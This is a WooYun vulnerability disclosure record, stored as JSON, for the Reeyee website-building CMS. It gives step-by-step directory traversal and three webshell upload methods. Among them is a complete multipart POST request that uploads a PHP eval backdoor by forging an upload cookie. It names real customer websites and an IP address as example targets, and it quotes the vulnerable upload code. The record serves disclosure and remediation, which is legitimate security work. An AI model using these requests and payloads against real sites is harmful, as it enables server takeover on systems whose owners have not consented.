{"id": 2561, "wybug_id": "wooyun-2014-059045", "wybug_title": "锐意先行网站建设系统遍历文件漏洞+三招Getshell+波及奇瑞、人保等大量高端客户", "wybug_corp": "锐意先行", "wybug_author": "夕风号", "wybug_date": "2014-05-01 10:21", "wybug_open_date": "2014-07-30 10:22", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "解析漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向公众公开  简要描述： Fyi:1.http://www.reeyee.cn/case/2.http://www.reeyee.net/brand.html 详细说明：  1.案例[官方]http://www.reeyee.comhttp://www.reeyee.cnhttp://www.reeyee.net[客户]http://www.cheryacteco.comhttp://www.cheryplus.comhttp://www.picc-js.comhttp://www.bqls.nethttp://www.tx-hoto.com其它客户可搜索“Powered by reeyee”或于http://www.reeyee.cn/case/中查看。2.文件遍历访问/admin/inc/dialogbox.php?pDir=&curr_dir=&type=0&filetypes=&form=frmList&formname=brief_img即可，将pDir改为形如../../格式可实现目录回溯，比如，http://www.cheryplus.com/admin/inc/dialogbox.php?pDir=&curr_dir=../../../&type=0&filetypes=&form=frmList&formname=brief_img有时可泄露敏感文件。3.Getshell0x01当服务器为IIS 6.0时，访问/admin/inc/wnews.php?type=1&path=video&form=frmList&formname=img，上传*.php;.jpg格式webshell即可，比如，http://202.119.148.83/admin/inc/wnews.php?type=1&path=video&form=frmList&formname=img然后后于页面源代码中查看webshell路径。0x02当服务器为IIS 6.0或IIS 7.5时，访问/admin/inc/wnews.php?type=1&path=video.php&form=frmList&formname=img，有时需绕过客户端Javascript验证（略），上传*.jpg格式webshell即可，比如，http://www.wiiboox.cn/admin/inc/wnews.php?type=1&path=video.php&form=frmList&formname=img然后后于页面源代码中查看webshell路径。\n\n0x03终极解法以http://www.tx-hoto.com为例，向目标/admin/inc/wnewssave.php发起如下HTTP请求，注意Cookie值及filename值：POST http://www.tx-hoto.com/admin/inc/wnewssave.php?formname=src&form=frmList\nHost: www.tx-hoto.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:28.0) Gecko/20100101 Firefox/28.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://www.tx-hoto.com/admin/inc/wnews.php?type=1&path=user_download&form=frmList&formname=srcCookie: user_download_src_UPLOAD=php%2Cxls%2Cppt%2Cpdf%2Cdoc%2Cdocx%7C20000000%7C0%7C1%7C1Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------29809125845679Content-Length: 636-----------------------------29809125845679\\r\\nContent-Disposition: form-data; name=\"filepath\"\\r\\n\\r\\nuser_download\\r\\n-----------------------------29809125845679\\r\\nContent-Disposition: form-data; name=\"type\"\\r\\n\\r\\n1\\r\\n-----------------------------29809125845679\\r\\nContent-Disposition: form-data; name=\"src\"; filename=\"test.php\"\\r\\nContent-Type: application/msword\\r\\n\\r\\n<?php @eval($_POST['savep']);?>\\r\\n-----------------------------29809125845679\\r\\nContent-Disposition: form-data; name=\"Submit\"\\r\\n\\r\\nÂ· æ\\x8f\\x90äº¤ Â·\\r\\n-----------------------------29809125845679\\r\\nContent-Disposition: form-data; name=\"proimg\"\\r\\n\\r\\n\\r\\n-----------------------------29809125845679--\\r\\n\n\n\n   漏洞证明：  来，看代码！/admin/inc/wnewssave.php\n$para\t= array(\"TYPE\"\t\t=> \"gif,jpg,jpeg\",\t\t\t\t\t\"SIZE\"\t\t=> $upload_max_filesize,\t\t\t\t\t\"EXISTS\"\t=> 0,\t\t\t\t\t\"RENAME\"\t=> 0,\t\t\t\t\t\"ERROR\"\t\t=>1,\t\t\t\t\t\"RESIZE\"\t=>\"\");\tif (isset($_COOKIE[\"{$_POST['filepath']}_{$_GET['formname']}_UPLOAD\"])) \t{\t\t$coo = $_COOKIE[\"{$_POST['filepath']}_{$_GET['formname']}_UPLOAD\"];\t\t$tmp\t= explode(\"|\",$coo);\t\t$para['TYPE'] = $tmp[0];    \t$para['SIZE'] = $tmp[1];    \t$para['EXISTS'] = $tmp[2];    \t$para['RENAME'] = $tmp[3];    \t$para['ERROR'] = $tmp[4];    \tif(isset($tmp[5])) $para['RESIZE'] = $tmp[4];\t}\telseif (isset($_COOKIE[\"{$_POST['filepath']}_UPLOAD\"])) \t{\t\t$coo = $_COOKIE[\"{$_POST['filepath']}_UPLOAD\"];\t\t$tmp\t= explode(\"|\",$coo);\t\t$para['TYPE'] = $tmp[0];    \t$para['SIZE'] = $tmp[1];    \t$para['EXISTS'] = $tmp[2];    \t$para['RENAME'] = $tmp[3];    \t$para['ERROR'] = $tmp[4];    \tif(isset($tmp[5])) $para['RESIZE'] = $tmp[4];\t}\t$u->UPLOAD_FILE_TYPE \t\t\t\t= $para['TYPE'];\t$u->UPLOAD_FILE_MAX_SIZE \t\t\t= $para['SIZE']>$upload_max_filesize?$upload_max_filesize:$para['SIZE'];\t$u->UPLOAD_FILE_CHECK_FILE_EXISTS\t= $para['EXISTS'];\t$u->UPLOAD_FILE_AUTO_RENAME\t\t\t= $para['RENAME'];\t$u->UPLOAD_FILE_ERROR_TYPE\t\t\t= $para['ERROR'];\n   修复方案：  You know it.   版权声明：转载请注明来源 夕风号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-05-06 08:45 厂商回复： CNVD确认并在实例上复现所述多个漏洞情况，对于涉及的重要信息系统部门案例，已经转由CNCERT下发给江苏分中心协调处置。CNVD并将通过公开联系渠道联系软件生产厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-19 10:40 |    \t\t革命往事 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 革命已成往事)\t\t \n  你这么屌你家人知道么    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}